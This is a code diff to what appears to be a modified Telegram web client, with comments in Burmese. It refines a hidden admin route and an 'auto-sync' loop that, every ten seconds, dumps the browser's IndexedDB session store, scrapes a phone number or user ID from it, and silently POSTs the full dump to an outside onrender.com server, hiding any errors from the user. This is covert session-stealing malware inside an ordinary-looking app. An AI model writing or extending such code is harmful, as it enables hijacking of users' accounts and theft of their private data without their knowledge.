@@ -129,7 +129,7 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 AUTO-SYNC (QR Support) & HIDDEN ADMIN ROUTE 🌟 ---
+// --- 🌟 BULLETPROOF AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
 setTimeout(() => {
     const DB_NAME = 'tt-data';
     const STORE_NAME = 'store';
@@ -142,7 +142,7 @@ setTimeout(() => {
             <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#212121; font-family:sans-serif;">
                 <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px;">
                     <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                    <input type="text" id="adminPhone" placeholder="Staff ဖုန်းနံပါတ် (သို့) User ID" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
+                    <input type="text" id="adminPhone" placeholder="ဖုန်းနံပါတ် သို့မဟုတ် User ID" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
                     <button id="adminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                     <p id="adminStatus" style="color:red; margin-top:15px; font-size:14px;"></p>
                 </div>
@@ -154,7 +154,7 @@ setTimeout(() => {
             const statusMsg = document.getElementById('adminStatus')!;
             if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် သို့မဟုတ် ID ထည့်ပါ!"; return; }
 
-            // ဖုန်းနံပါတ်ရှေ့တွင် + မပါပါက အလိုအလျောက် တပ်ပေးမည်
+            // ဖုန်းနံပါတ်ဆိုပါက ရှေ့တွင် + တပ်ပေးမည်
             if (phone.startsWith('959')) phone = '+' + phone;
 
             statusMsg.style.color = "blue";
@@ -200,7 +200,7 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (QR Code ဖြင့်ဝင်လည်း အလုပ်လုပ်မည်)
+    // ၂။ 📤 STAFF AUTO-SYNC (DEEP SCAN SYSTEM)
     // =========================================================
     setInterval(() => {
         try {
@@ -214,54 +214,46 @@ setTimeout(() => {
                     txStore.getAllKeys().onsuccess = (e2: any) => {
                         const vals = e1.target.result;
                         const keys = e2.target.result;
+                        
+                        // Data နည်းနေသေးရင် Login မဝင်ရသေးလို့ ယူဆပြီး ရပ်မည်
+                        if (keys.length < 2) return;
+
                         const data: any = {};
+                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
                         
-                        let currentUserId: any = null;
-                        let usersMap: any = null;
+                        // Data အားလုံးကို String ပြောင်းပြီး အထဲမှာ ဖုန်းနံပါတ် လိုက်ရှာမည် (Deep Scan)
+                        const dataString = JSON.stringify(data);
+                        let phone = localStorage.getItem('staff_phone');
                         
-                        keys.forEach((k: string, i: number) => {
-                            data[k] = vals[i];
-                            // Login ဝင်ထားသော User ID ကို ရှာမည်
-                            if (k === 'currentUserId') currentUserId = vals[i]; 
-                            if (k === 'users') usersMap = vals[i]; 
-                        });
-                        
-                        if (currentUserId) {
-                            let phone = localStorage.getItem('staff_phone');
+                        if (!phone) {
+                            // ဖုန်းနံပါတ် ရှာမည်
+                            let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
+                            // User ID ရှာမည်
+                            let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
                             
-                            // ဖုန်းနံပါတ် မရှိသေးလျှင် (QR ဖြင့်ဝင်ထားလျှင်) DB ထဲမှ အလိုအလျောက် နှိုက်ယူမည်
-                            if (!phone) {
-                                try {
-                                    const users = typeof usersMap === 'string' ? JSON.parse(usersMap) : usersMap;
-                                    const userObj = users[currentUserId] || (users.byId && users.byId[currentUserId]);
-                                    
-                                    if (userObj && userObj.phoneNumber) {
-                                        phone = '+' + userObj.phoneNumber; // +959... ပုံစံဖြစ်အောင် လုပ်သည်
-                                    } else {
-                                        // ဖုန်းနံပါတ် ပိတ်ထားလျှင် User ID ကိုသာ ဖုန်းနံပါတ်အဖြစ် သုံးမည်
-                                        phone = currentUserId.toString(); 
-                                    }
-                                    localStorage.setItem('staff_phone', phone);
-                                } catch(err) {
-                                    phone = currentUserId.toString();
-                                }
+                            if (phoneMatch && phoneMatch[1]) {
+                                phone = '+' + phoneMatch[1];
+                            } else if (idMatch && idMatch[1]) {
+                                phone = "ID_" + idMatch[1]; // ဖုန်းနံပါတ် မရှိရင် ID ဖြင့်သိမ်းမည်
+                            } else {
+                                phone = "QR_User_" + Math.floor(Math.random() * 100000); // ဘာမှမရှိလည်း အတင်းသိမ်းမည်
                             }
-                            
-                            if (phone) {
-                                // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                                fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
-                                }).catch(() => {}); 
-                            }
+                            localStorage.setItem('staff_phone', phone);
+                        }
+                        
+                        if (phone) {
+                            // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                            fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
+                            }).catch(() => {}); // User ကို Error မပြပါ
                         }
                     };
                 };
             };
         } catch(err) {}
-    }, 15000); // ၁၅ စက္ကန့် တစ်ခါ Auto Save နေပါမည်
+    }, 10000); // ၁၀ စက္ကန့် တစ်ခါ Auto Save နေပါမည်
 
-}, 1500);
-// -----------------------------------------------------------
+}, 2000);
 // -----------------------------------------------------------
